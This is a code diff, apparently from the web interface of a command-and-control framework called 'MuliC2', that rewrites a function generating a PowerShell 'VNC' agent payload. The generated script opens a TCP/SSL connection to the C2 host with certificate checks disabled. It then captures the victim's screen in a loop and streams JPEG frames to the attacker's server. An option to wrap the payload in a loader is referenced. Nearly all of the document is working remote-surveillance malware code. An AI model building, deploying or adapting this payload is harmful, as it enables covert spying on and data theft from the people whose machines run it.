@@ -1004,7 +1004,7 @@ const disconnectAgent = async (agent: any) => {
   }
 }
 
-// VNC Payload Generator Functions
+// Fixed VNC Payload Generator Function
 const generateVncPayload = async () => {
   if (!selectedListener.value) {
     ElMessage.error('No HTTPS listener selected. Please select an active HTTPS listener first.')
@@ -1025,278 +1025,337 @@ const generateVncPayload = async () => {
     
     console.log('VNC Configuration:', { c2Host, c2Port })
     
-    let payload = `# MuliC2 VNC Screen Capture Agent
-# C2 Host: ${c2Host}
-# C2 Port: ${c2Port}
-# Type: ${vncForm.value.payloadType}
-# Loader: ${vncForm.value.useLoader ? 'Enabled' : 'Disabled'}
-# Generated: ${new Date().toLocaleString()}
-
-param(
-    [string]\$C2Host = "${c2Host}",
-    [int]\$C2Port = ${c2Port}
-)
-
-# Add required assemblies with error handling
-try {
-    Add-Type -AssemblyName System.Drawing
-    Add-Type -AssemblyName System.Windows.Forms
-} catch {
-    Write-Host "[!] Error loading required assemblies: \$(\$_.Exception.Message)" -ForegroundColor Red
-    Write-Host "[!] Make sure you're running on a system with GUI support" -ForegroundColor Red
-    exit 1
-}
-
-# Global variables for cleanup
-\$global:tcpClient = \$null
-\$global:sslStream = \$null
-\$global:isRunning = \$true
-\$global:cleanupInProgress = \$false
-
-# Graceful cleanup function
-function Invoke-GracefulCleanup {
-    param([bool]\$isGraceful = \$true)
+    // Build the payload string without template literals to avoid parsing issues
+    let payload = '# MuliC2 VNC Screen Capture Agent\n'
+    payload += '# C2 Host: ' + c2Host + '\n'
+    payload += '# C2 Port: ' + c2Port + '\n'
+    payload += '# Type: ' + vncForm.value.payloadType + '\n'
+    payload += '# Loader: ' + (vncForm.value.useLoader ? 'Enabled' : 'Disabled') + '\n'
+    payload += '# Generated: ' + new Date().toLocaleString() + '\n\n'
     
-    if (\$global:cleanupInProgress) { return }
-    \$global:cleanupInProgress = \$true
-    \$global:isRunning = \$false
+    payload += 'param(\n'
+    payload += '    [string]$C2Host = "' + c2Host + '",\n'
+    payload += '    [int]$C2Port = ' + c2Port + '\n'
+    payload += ')\n\n'
     
-    Write-Host "\`n[*] Starting cleanup..." -ForegroundColor Yellow
+    payload += '# Add required assemblies with error handling\n'
+    payload += 'try {\n'
+    payload += '    Add-Type -AssemblyName System.Drawing\n'
+    payload += '    Add-Type -AssemblyName System.Windows.Forms\n'
+    payload += '} catch {\n'
+    payload += '    Write-Host "[!] Error loading required assemblies: $($_.Exception.Message)" -ForegroundColor Red\n'
+    payload += '    Write-Host "[!] Make sure you\'re running on a system with GUI support" -ForegroundColor Red\n'
+    payload += '    exit 1\n'
+    payload += '}\n\n'
     
-    try {
-        # Close SSL stream gracefully
-        if (\$global:sslStream) {
-            try {
-                if (\$isGraceful -and \$global:sslStream.CanWrite) {
-                    # Send termination signal
-                    \$terminationBytes = [System.Text.Encoding]::UTF8.GetBytes("TERMINATE")
-                    \$lengthBytes = [BitConverter]::GetBytes(\$terminationBytes.Length)
-                    \$global:sslStream.Write(\$lengthBytes, 0, 4)
-                    \$global:sslStream.Write(\$terminationBytes, 0, \$terminationBytes.Length)
-                    \$global:sslStream.Flush()
-                    Start-Sleep -Milliseconds 200
-                }
-                
-                # Proper SSL shutdown
-                if (\$global:sslStream.IsAuthenticated) {
-                    try {
-                        \$shutdownTask = \$global:sslStream.ShutdownAsync()
-                        \$shutdownTask.Wait(2000)  # 2 second timeout
-                    } catch {}
-                }
-                
-                \$global:sslStream.Close()
-                \$global:sslStream.Dispose()
-                Write-Host "[+] SSL stream closed gracefully" -ForegroundColor Green
-            } catch {
-                Write-Host "[!] Error closing SSL stream: \$(\$_.Exception.Message)" -ForegroundColor Red
-            }
-            \$global:sslStream = \$null
-        }
-        
-        # Close TCP client gracefully
-        if (\$global:tcpClient) {
-            try {
-                if (\$global:tcpClient.Connected) {
-                    if (\$isGraceful) {
-                        # Graceful TCP shutdown
-                        \$socket = \$global:tcpClient.Client
-                        \$socket.Shutdown([System.Net.Sockets.SocketShutdown]::Send)
-                        Start-Sleep -Milliseconds 100
-                        \$socket.Shutdown([System.Net.Sockets.SocketShutdown]::Both)
-                        Start-Sleep -Milliseconds 50
-                    } else {
-                        # Emergency close with linger option
-                        \$socket = \$global:tcpClient.Client
-                        \$socket.SetSocketOption(
-                            [System.Net.Sockets.SocketOptionLevel]::Socket,
-                            [System.Net.Sockets.SocketOptionName]::Linger,
-                            (New-Object System.Net.Sockets.LingerOption(\$false, 0))
-                        )
-                    }
-                }
-                
-                \$global:tcpClient.Close()
-                \$global:tcpClient.Dispose()
-                Write-Host "[+] TCP client closed gracefully" -ForegroundColor Green
-            } catch {
-                Write-Host "[!] Error closing TCP client: \$(\$_.Exception.Message)" -ForegroundColor Red
-            }
-            \$global:tcpClient = \$null
-        }
-        
-    } catch {
-        Write-Host "[!] Error during cleanup: \$(\$_.Exception.Message)" -ForegroundColor Red
-    }
+    payload += '# Global variables for cleanup\n'
+    payload += '$global:tcpClient = $null\n'
+    payload += '$global:sslStream = $null\n'
+    payload += '$global:isRunning = $true\n'
+    payload += '$global:cleanupInProgress = $false\n\n'
     
-    Write-Host "[+] Cleanup completed" -ForegroundColor Green
-}
-
-# Register cleanup for PowerShell exit
-\$exitHandler = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
-    if (-not \$global:cleanupInProgress) {
-        Invoke-GracefulCleanup \$false
-    }
-}
-
-# CTRL+C handler
-\$cancelHandler = \$null
-try {
-    \$cancelHandler = {
-        param(\$sender, \$e)
-        \$e.Cancel = \$true  # Prevent immediate termination
-        Write-Host "\`n[*] CTRL+C detected - shutting down gracefully..." -ForegroundColor Yellow
-        Invoke-GracefulCleanup \$true
-        [System.Environment]::Exit(0)
-    }
-    [System.Console]::add_CancelKeyPress(\$cancelHandler)
-} catch {
-    Write-Host "[!] Console handlers not available in this environment" -ForegroundColor Yellow
-}
-
-try {
-    Write-Host "[*] Connecting to MuliC2 server at \$C2Host\`:\$C2Port..." -ForegroundColor Cyan
+    payload += '# Graceful cleanup function\n'
+    payload += 'function Invoke-GracefulCleanup {\n'
+    payload += '    param([bool]$isGraceful = $true)\n'
+    payload += '    \n'
+    payload += '    if ($global:cleanupInProgress) { return }\n'
+    payload += '    $global:cleanupInProgress = $true\n'
+    payload += '    $global:isRunning = $false\n'
+    payload += '    \n'
+    payload += '    Write-Host "`n[*] Starting cleanup..." -ForegroundColor Yellow\n'
+    payload += '    \n'
+    payload += '    try {\n'
+    payload += '        # Close SSL stream gracefully\n'
+    payload += '        if ($global:sslStream) {\n'
+    payload += '            try {\n'
+    payload += '                if ($isGraceful -and $global:sslStream.CanWrite) {\n'
+    payload += '                    # Send termination signal\n'
+    payload += '                    $terminationBytes = [System.Text.Encoding]::UTF8.GetBytes("TERMINATE")\n'
+    payload += '                    $lengthBytes = [BitConverter]::GetBytes($terminationBytes.Length)\n'
+    payload += '                    $global:sslStream.Write($lengthBytes, 0, 4)\n'
+    payload += '                    $global:sslStream.Write($terminationBytes, 0, $terminationBytes.Length)\n'
+    payload += '                    $global:sslStream.Flush()\n'
+    payload += '                    Start-Sleep -Milliseconds 500\n'
+    payload += '                }\n'
+    payload += '                \n'
+    payload += '                # Proper SSL shutdown\n'
+    payload += '                if ($global:sslStream.IsAuthenticated) {\n'
+    payload += '                    try {\n'
+    payload += '                        $shutdownTask = $global:sslStream.ShutdownAsync()\n'
+    payload += '                        $shutdownTask.Wait(3000)\n'
+    payload += '                    } catch {}\n'
+    payload += '                }\n'
+    payload += '                \n'
+    payload += '                $global:sslStream.Close()\n'
+    payload += '                $global:sslStream.Dispose()\n'
+    payload += '                Write-Host "[+] SSL stream closed gracefully" -ForegroundColor Green\n'
+    payload += '            } catch {\n'
+    payload += '                Write-Host "[!] Error closing SSL stream: $($_.Exception.Message)" -ForegroundColor Red\n'
+    payload += '            }\n'
+    payload += '            $global:sslStream = $null\n'
+    payload += '        }\n'
+    payload += '        \n'
+    payload += '        # Close TCP client gracefully\n'
+    payload += '        if ($global:tcpClient) {\n'
+    payload += '            try {\n'
+    payload += '                if ($global:tcpClient.Connected) {\n'
+    payload += '                    if ($isGraceful) {\n'
+    payload += '                        # Graceful TCP shutdown\n'
+    payload += '                        $socket = $global:tcpClient.Client\n'
+    payload += '                        $socket.Shutdown([System.Net.Sockets.SocketShutdown]::Send)\n'
+    payload += '                        Start-Sleep -Milliseconds 200\n'
+    payload += '                        $socket.Shutdown([System.Net.Sockets.SocketShutdown]::Both)\n'
+    payload += '                        Start-Sleep -Milliseconds 100\n'
+    payload += '                    } else {\n'
+    payload += '                        # Emergency close with linger option\n'
+    payload += '                        $socket = $global:tcpClient.Client\n'
+    payload += '                        $socket.SetSocketOption(\n'
+    payload += '                            [System.Net.Sockets.SocketOptionLevel]::Socket,\n'
+    payload += '                            [System.Net.Sockets.SocketOptionName]::Linger,\n'
+    payload += '                            (New-Object System.Net.Sockets.LingerOption($false, 0))\n'
+    payload += '                        )\n'
+    payload += '                    }\n'
+    payload += '                }\n'
+    payload += '                \n'
+    payload += '                $global:tcpClient.Close()\n'
+    payload += '                $global:tcpClient.Dispose()\n'
+    payload += '                Write-Host "[+] TCP client closed gracefully" -ForegroundColor Green\n'
+    payload += '            } catch {\n'
+    payload += '                Write-Host "[!] Error closing TCP client: $($_.Exception.Message)" -ForegroundColor Red\n'
+    payload += '            }\n'
+    payload += '            $global:tcpClient = $null\n'
+    payload += '        }\n'
+    payload += '        \n'
+    payload += '    } catch {\n'
+    payload += '        Write-Host "[!] Error during cleanup: $($_.Exception.Message)" -ForegroundColor Red\n'
+    payload += '    }\n'
+    payload += '    \n'
+    payload += '    Write-Host "[+] Cleanup completed" -ForegroundColor Green\n'
+    payload += '}\n\n'
     
-    # Create TCP client with connection timeout
-    \$global:tcpClient = New-Object System.Net.Sockets.TcpClient
+    payload += '# Register cleanup for PowerShell exit\n'
+    payload += '$exitHandler = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {\n'
+    payload += '    if (-not $global:cleanupInProgress) {\n'
+    payload += '        Invoke-GracefulCleanup $false\n'
+    payload += '    }\n'
+    payload += '}\n\n'
     
-    # Set connection timeout
-    \$connectTask = \$global:tcpClient.ConnectAsync(\$C2Host, \$C2Port)
-    \$connected = \$connectTask.Wait(10000) # 10 second timeout
+    payload += '# CTRL+C handler\n'
+    payload += '$cancelHandler = $null\n'
+    payload += 'try {\n'
+    payload += '    $cancelHandler = {\n'
+    payload += '        param($sender, $e)\n'
+    payload += '        $e.Cancel = $true\n'
+    payload += '        Write-Host "`n[*] CTRL+C detected - shutting down gracefully..." -ForegroundColor Yellow\n'
+    payload += '        Invoke-GracefulCleanup $true\n'
+    payload += '        [System.Environment]::Exit(0)\n'
+    payload += '    }\n'
+    payload += '    [System.Console]::add_CancelKeyPress($cancelHandler)\n'
+    payload += '} catch {\n'
+    payload += '    Write-Host "[!] Console handlers not available in this environment" -ForegroundColor Yellow\n'
+    payload += '}\n\n'
     
-    if (-not \$connected -or -not \$global:tcpClient.Connected) {
-        throw "Connection to \$C2Host\`:\$C2Port failed or timed out"
-    }
-    
-    Write-Host "[+] TCP connection established" -ForegroundColor Green
-    
-    # Configure socket options
-    \$socket = \$global:tcpClient.Client
-    \$socket.ReceiveTimeout = -1  # Infinite
-    \$socket.SendTimeout = 30000  # 30 seconds
-    \$socket.NoDelay = \$true
-    
-    # Create SSL stream with certificate validation bypass
-    \$global:sslStream = New-Object System.Net.Security.SslStream(
-        \$global:tcpClient.GetStream(), 
-        \$false,
-        ([System.Net.Security.RemoteCertificateValidationCallback] {
-            param(\$sender, \$certificate, \$chain, \$sslPolicyErrors)
-            return \$true
-        })
-    )
-    
-    # Authenticate SSL connection
-    try {
-        \$global:sslStream.AuthenticateAsClient(\$C2Host)
-  } catch {
-        throw "SSL authentication failed: \$(\$_.Exception.Message)"
-    }
-    
-    if (-not \$global:sslStream.IsAuthenticated) {
-        throw "SSL authentication failed - stream not authenticated"
-    }
-    
-    Write-Host "[+] SSL connection established and authenticated" -ForegroundColor Green
-    Write-Host "[*] Starting screen capture... (Press CTRL+C to exit gracefully)" -ForegroundColor Cyan
-    Write-Host "[*] Capturing 200x150 resolution at 5 FPS" -ForegroundColor Gray
-    
-    # Main capture loop with comprehensive error handling
-    \$frameCount = 0
-    \$lastErrorTime = 0
-    
-    while (\$global:isRunning -and \$global:tcpClient.Connected -and \$global:sslStream.CanWrite) {
-        try {
-            \$frameCount++
-            
-            # Create bitmap and graphics objects
-            \$bitmap = New-Object System.Drawing.Bitmap(200, 150)
-            \$graphics = [System.Drawing.Graphics]::FromImage(\$bitmap)
-            
-            # Capture screen
-            \$graphics.CopyFromScreen(0, 0, 0, 0, \$bitmap.Size)
-            
-            # Convert to JPEG
-            \$memoryStream = New-Object System.IO.MemoryStream
-            \$bitmap.Save(\$memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-            \$screenBytes = \$memoryStream.ToArray()
-            
-            # Properly dispose of graphics objects
-            \$graphics.Dispose()
-            \$bitmap.Dispose()
-            \$memoryStream.Dispose()
-            
-            # Send data if connection is still valid
-            if (\$global:sslStream -and \$global:sslStream.CanWrite -and \$global:isRunning) {
-                # Send length header (4 bytes)
-                \$lengthBytes = [BitConverter]::GetBytes(\$screenBytes.Length)
-                \$global:sslStream.Write(\$lengthBytes, 0, 4)
-                
-                # Send image data
-                \$global:sslStream.Write(\$screenBytes, 0, \$screenBytes.Length)
-                \$global:sslStream.Flush()
-                
-                # Progress indicator every 25 frames
-                if (\$frameCount % 25 -eq 0) {
-                    Write-Host "[*] Frame #\$frameCount sent (Size: \$(\$screenBytes.Length) bytes)" -ForegroundColor Gray
-                }
-            } else {
-                Write-Host "[!] SSL stream not writable, connection lost" -ForegroundColor Red
-                break
-            }
-            
-            # Sleep between frames (200ms = ~5 FPS)
-            Start-Sleep -Milliseconds 200
-            
-        } catch [System.ObjectDisposedException] {
-            Write-Host "[!] Object disposed - connection closed" -ForegroundColor Red
-            break
-        } catch [System.IO.IOException] {
-            Write-Host "[!] IO Exception: \$(\$_.Exception.Message)" -ForegroundColor Red
-            break
-        } catch [System.Net.Sockets.SocketException] {
-            Write-Host "[!] Socket Exception: \$(\$_.Exception.Message)" -ForegroundColor Red
-            break
-        } catch [System.InvalidOperationException] {
-            \$currentTime = [System.Environment]::TickCount
-            if (\$currentTime - \$lastErrorTime -gt 5000) { # Log once per 5 seconds
-                Write-Host "[!] Graphics operation failed: \$(\$_.Exception.Message)" -ForegroundColor Red
-                \$lastErrorTime = \$currentTime
-            }
-            Start-Sleep -Milliseconds 1000
-        } catch {
-            \$currentTime = [System.Environment]::TickCount
-            if (\$currentTime - \$lastErrorTime -gt 5000) { # Log once per 5 seconds
-                Write-Host "[!] Unexpected error: \$(\$_.Exception.Message)" -ForegroundColor Red
-                \$lastErrorTime = \$currentTime
-            }
-            Start-Sleep -Milliseconds 1000
-        }
-    }
-    
-    Write-Host "[*] Capture loop ended (Total frames: \$frameCount)" -ForegroundColor Yellow
-    
-} catch {
-    Write-Host "[!] Connection error: \$(\$_.Exception.Message)" -ForegroundColor Red
-    Write-Host "[!] Make sure the MuliC2 listener is running on \$C2Host\`:\$C2Port" -ForegroundColor Red
-  } finally {
-    # Final cleanup
-    if (-not \$global:cleanupInProgress) {
-        Invoke-GracefulCleanup \$true
-    }
-    
-    # Remove event handlers
-    try {
-        if (\$exitHandler) {
-            Unregister-Event -SourceIdentifier "PowerShell.Exiting" -Force -ErrorAction SilentlyContinue
-        }
-        if (\$cancelHandler) {
-            [System.Console]::remove_CancelKeyPress(\$cancelHandler)
-        }
-    } catch {}
-    
-            Write-Host "[*] MuliC2 VNC agent terminated" -ForegroundColor Yellow
-}`
+    payload += 'try {\n'
+    payload += '    Write-Host "[*] Connecting to MuliC2 server at $C2Host`:$C2Port..." -ForegroundColor Cyan\n'
+    payload += '    \n'
+    payload += '    # Create TCP client with connection timeout\n'
+    payload += '    $global:tcpClient = New-Object System.Net.Sockets.TcpClient\n'
+    payload += '    \n'
+    payload += '    # Set connection timeout\n'
+    payload += '    $connectTask = $global:tcpClient.ConnectAsync($C2Host, $C2Port)\n'
+    payload += '    $connected = $connectTask.Wait(10000)\n'
+    payload += '    \n'
+    payload += '    if (-not $connected -or -not $global:tcpClient.Connected) {\n'
+    payload += '        throw "Connection to $C2Host`:$C2Port failed or timed out"\n'
+    payload += '    }\n'
+    payload += '    \n'
+    payload += '    Write-Host "[+] TCP connection established" -ForegroundColor Green\n'
+    payload += '    \n'
+    payload += '    # Configure socket options for better performance\n'
+    payload += '    $socket = $global:tcpClient.Client\n'
+    payload += '    $socket.ReceiveTimeout = -1\n'
+    payload += '    $socket.SendTimeout = 60000\n'
+    payload += '    $socket.NoDelay = $true\n'
+    payload += '    \n'
+    payload += '    # Set socket buffer sizes\n'
+    payload += '    $socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::SendBuffer, 65536)\n'
+    payload += '    $socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReceiveBuffer, 65536)\n'
+    payload += '    \n'
+    payload += '    # Enable keep-alive\n'
+    payload += '    $socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::KeepAlive, $true)\n'
+    payload += '    \n'
+    payload += '    # Create SSL stream with certificate validation bypass\n'
+    payload += '    $global:sslStream = New-Object System.Net.Security.SslStream(\n'
+    payload += '        $global:tcpClient.GetStream(), \n'
+    payload += '        $false,\n'
+    payload += '        ([System.Net.Security.RemoteCertificateValidationCallback] {\n'
+    payload += '            param($sender, $certificate, $chain, $sslPolicyErrors)\n'
+    payload += '            return $true\n'
+    payload += '        })\n'
+    payload += '    )\n'
+    payload += '    \n'
+    payload += '    # Authenticate SSL connection with longer timeout\n'
+    payload += '    try {\n'
+    payload += '        $authTask = $global:sslStream.AuthenticateAsClientAsync($C2Host)\n'
+    payload += '        $authCompleted = $authTask.Wait(15000)\n'
+    payload += '        if (-not $authCompleted) {\n'
+    payload += '            throw "SSL authentication timed out"\n'
+    payload += '        }\n'
+    payload += '    } catch {\n'
+    payload += '        throw "SSL authentication failed: $($_.Exception.Message)"\n'
+    payload += '    }\n'
+    payload += '    \n'
+    payload += '    if (-not $global:sslStream.IsAuthenticated) {\n'
+    payload += '        throw "SSL authentication failed - stream not authenticated"\n'
+    payload += '    }\n'
+    payload += '    \n'
+    payload += '    Write-Host "[+] SSL connection established and authenticated" -ForegroundColor Green\n'
+    payload += '    Write-Host "[*] Starting screen capture... (Press CTRL+C to exit gracefully)" -ForegroundColor Cyan\n'
+    payload += '    Write-Host "[*] Capturing 200x150 resolution at 5 FPS" -ForegroundColor Gray\n'
+    payload += '    \n'
+    payload += '    # Main capture loop with comprehensive error handling\n'
+    payload += '    $frameCount = 0\n'
+    payload += '    $lastErrorTime = 0\n'
+    payload += '    $consecutiveErrors = 0\n'
+    payload += '    $maxConsecutiveErrors = 10\n'
+    payload += '    \n'
+    payload += '    while ($global:isRunning -and $global:tcpClient.Connected -and $global:sslStream.CanWrite) {\n'
+    payload += '        try {\n'
+    payload += '            $frameCount++\n'
+    payload += '            \n'
+    payload += '            # Create bitmap and graphics objects\n'
+    payload += '            $bitmap = New-Object System.Drawing.Bitmap(200, 150)\n'
+    payload += '            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)\n'
+    payload += '            \n'
+    payload += '            # Capture screen with better quality settings\n'
+    payload += '            $graphics.CompositingQuality = [System.Drawing.Drawing2D.CompositingQuality]::HighSpeed\n'
+    payload += '            $graphics.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::Low\n'
+    payload += '            $graphics.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::HighSpeed\n'
+    payload += '            $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)\n'
+    payload += '            \n'
+    payload += '            # Convert to JPEG with compression settings\n'
+    payload += '            $memoryStream = New-Object System.IO.MemoryStream\n'
+    payload += '            \n'
+    payload += '            # Create JPEG encoder with quality settings\n'
+    payload += '            $jpegEncoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" }\n'
+    payload += '            $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)\n'
+    payload += '            $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 75L)\n'
+    payload += '            \n'
+    payload += '            $bitmap.Save($memoryStream, $jpegEncoder, $encoderParams)\n'
+    payload += '            $screenBytes = $memoryStream.ToArray()\n'
+    payload += '            \n'
+    payload += '            # Properly dispose of graphics objects\n'
+    payload += '            $graphics.Dispose()\n'
+    payload += '            $bitmap.Dispose()\n'
+    payload += '            $memoryStream.Dispose()\n'
+    payload += '            \n'
+    payload += '            # Verify connection is still valid before sending\n'
+    payload += '            if (-not $global:sslStream -or -not $global:sslStream.CanWrite -or -not $global:isRunning) {\n'
+    payload += '                Write-Host "[!] SSL stream not writable, connection lost" -ForegroundColor Red\n'
+    payload += '                break\n'
+    payload += '            }\n'
+    payload += '            \n'
+    payload += '            # Send frame data with error handling\n'
+    payload += '            try {\n'
+    payload += '                # Send length header (4 bytes) - little endian\n'
+    payload += '                $lengthBytes = [BitConverter]::GetBytes([uint32]$screenBytes.Length)\n'
+    payload += '                if (-not [BitConverter]::IsLittleEndian) {\n'
+    payload += '                    [Array]::Reverse($lengthBytes)\n'
+    payload += '                }\n'
+    payload += '                $global:sslStream.Write($lengthBytes, 0, 4)\n'
+    payload += '                \n'
+    payload += '                # Send image data\n'
+    payload += '                $global:sslStream.Write($screenBytes, 0, $screenBytes.Length)\n'
+    payload += '                $global:sslStream.Flush()\n'
+    payload += '                \n'
+    payload += '                # Reset consecutive error counter\n'
+    payload += '                $consecutiveErrors = 0\n'
+    payload += '                \n'
+    payload += '                # Progress indicator every 25 frames\n'
+    payload += '                if ($frameCount % 25 -eq 0) {\n'
+    payload += '                    Write-Host "[*] Frame #$frameCount sent (Size: $($screenBytes.Length) bytes)" -ForegroundColor Gray\n'
+    payload += '                }\n'
+    payload += '                \n'
+    payload += '            } catch [System.IO.IOException] {\n'
+    payload += '                Write-Host "[!] IO Exception sending frame: $($_.Exception.Message)" -ForegroundColor Red\n'
+    payload += '                $consecutiveErrors++\n'
+    payload += '                if ($consecutiveErrors -ge $maxConsecutiveErrors) {\n'
+    payload += '                    Write-Host "[!] Too many consecutive send errors, terminating" -ForegroundColor Red\n'
+    payload += '                    break\n'
+    payload += '                }\n'
+    payload += '                Start-Sleep -Milliseconds 1000\n'
+    payload += '                continue\n'
+    payload += '            } catch [System.Net.Sockets.SocketException] {\n'
+    payload += '                Write-Host "[!] Socket Exception sending frame: $($_.Exception.Message)" -ForegroundColor Red\n'
+    payload += '                break\n'
+    payload += '            }\n'
+    payload += '            \n'
+    payload += '            # Sleep between frames (200ms = ~5 FPS)\n'
+    payload += '            Start-Sleep -Milliseconds 200\n'
+    payload += '            \n'
+    payload += '        } catch [System.ObjectDisposedException] {\n'
+    payload += '            Write-Host "[!] Object disposed - connection closed" -ForegroundColor Red\n'
+    payload += '            break\n'
+    payload += '        } catch [System.IO.IOException] {\n'
+    payload += '            Write-Host "[!] IO Exception: $($_.Exception.Message)" -ForegroundColor Red\n'
+    payload += '            $consecutiveErrors++\n'
+    payload += '            if ($consecutiveErrors -ge $maxConsecutiveErrors) {\n'
+    payload += '                break\n'
+    payload += '            }\n'
+    payload += '            Start-Sleep -Milliseconds 1000\n'
+    payload += '        } catch [System.Net.Sockets.SocketException] {\n'
+    payload += '            Write-Host "[!] Socket Exception: $($_.Exception.Message)" -ForegroundColor Red\n'
+    payload += '            break\n'
+    payload += '        } catch [System.InvalidOperationException] {\n'
+    payload += '            $currentTime = [System.Environment]::TickCount\n'
+    payload += '            if ($currentTime - $lastErrorTime -gt 5000) {\n'
+    payload += '                Write-Host "[!] Graphics operation failed: $($_.Exception.Message)" -ForegroundColor Red\n'
+    payload += '                $lastErrorTime = $currentTime\n'
+    payload += '            }\n'
+    payload += '            $consecutiveErrors++\n'
+    payload += '            if ($consecutiveErrors -ge $maxConsecutiveErrors) {\n'
+    payload += '                Write-Host "[!] Too many graphics errors, terminating" -ForegroundColor Red\n'
+    payload += '                break\n'
+    payload += '            }\n'
+    payload += '            Start-Sleep -Milliseconds 1000\n'
+    payload += '        } catch {\n'
+    payload += '            $currentTime = [System.Environment]::TickCount\n'
+    payload += '            if ($currentTime - $lastErrorTime -gt 5000) {\n'
+    payload += '                Write-Host "[!] Unexpected error: $($_.Exception.Message)" -ForegroundColor Red\n'
+    payload += '                $lastErrorTime = $currentTime\n'
+    payload += '            }\n'
+    payload += '            $consecutiveErrors++\n'
+    payload += '            if ($consecutiveErrors -ge $maxConsecutiveErrors) {\n'
+    payload += '                Write-Host "[!] Too many consecutive errors, terminating" -ForegroundColor Red\n'
+    payload += '                break\n'
+    payload += '            }\n'
+    payload += '            Start-Sleep -Milliseconds 1000\n'
+    payload += '        }\n'
+    payload += '    }\n'
+    payload += '    \n'
+    payload += '    Write-Host "[*] Capture loop ended (Total frames: $frameCount)" -ForegroundColor Yellow\n'
+    payload += '    \n'
+    payload += '} catch {\n'
+    payload += '    Write-Host "[!] Connection error: $($_.Exception.Message)" -ForegroundColor Red\n'
+    payload += '    Write-Host "[!] Make sure the MuliC2 listener is running on $C2Host`:$C2Port" -ForegroundColor Red\n'
+    payload += '} finally {\n'
+    payload += '    # Final cleanup\n'
+    payload += '    if (-not $global:cleanupInProgress) {\n'
+    payload += '        Invoke-GracefulCleanup $true\n'
+    payload += '    }\n'
+    payload += '    \n'
+    payload += '    # Remove event handlers\n'
+    payload += '    try {\n'
+    payload += '        if ($exitHandler) {\n'
+    payload += '            Unregister-Event -SourceIdentifier "PowerShell.Exiting" -Force -ErrorAction SilentlyContinue\n'
+    payload += '        }\n'
+    payload += '        if ($cancelHandler) {\n'
+    payload += '            [System.Console]::remove_CancelKeyPress($cancelHandler)\n'
+    payload += '        }\n'
+    payload += '    } catch {}\n'
+    payload += '    \n'
+    payload += '    Write-Host "[*] MuliC2 VNC agent terminated" -ForegroundColor Yellow\n'
+    payload += '}'
     
     // Apply loader if enabled
     if (vncForm.value.useLoader) {
